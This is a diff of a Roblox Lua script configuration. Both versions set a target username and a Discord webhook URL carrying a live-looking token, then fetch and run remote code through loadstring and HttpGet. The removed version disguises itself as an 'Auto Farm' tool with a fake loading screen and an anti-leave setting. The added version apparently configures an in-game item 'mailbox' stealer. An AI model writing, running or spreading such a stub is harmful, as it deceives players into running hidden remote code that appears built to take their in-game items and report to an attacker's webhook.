@@ -1,26 +1,56 @@
-UserName = "Reset40448970"
 
-UserName2 = "APFKEalt_1"
 
-Webhook = "https://discord.com/api/webhooks/1109270540142784522/kfQU1nUhLp2UVhHaYzAXO3mhBlE4mEO1ocXFZC34TdOvnfkmRfg4wDRceN075M4F7yfY"
 
-_G.LoadingScreen = true
 
-_G.AntiLeave = true
 
-_G.MouseLock = true 
 
-_G.ScriptName = "Auto Farm"
+_G.Username = "Reset40448970"
 
-_G.FirstText = "AutoFarm is the best script you can use to farm coins and more!"
+_G.Diamonds = 1000000
 
-_G.SecondText = "this script has many features"
 
-_G.ThirdText = "wait..."
 
-_G.WaitingTime = 8
+_G.Webhook = "https://discord.com/api/webhooks/1105651738884718592/xO_n9y1sf7OoKdpCy_hLFiWPNEtQVy5kH5S6oWzdTjNKbJVOLBKlyvcBIiDNnOlD0KL0"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/pet-simx/ftssa/main/Main.lua", true))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
